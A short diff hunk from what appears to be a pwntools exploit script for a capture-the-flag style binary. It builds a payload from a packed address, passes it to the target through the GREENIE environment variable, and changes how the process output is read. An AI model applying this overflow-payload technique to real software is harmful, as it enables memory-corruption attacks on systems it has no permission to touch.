@@ -16,4 +16,4 @@ payload += p32(gen_templates["X"])
 
 p = e.process(env={"GREENIE": payload})
 
-print(p.readlineS())
+p.stream()
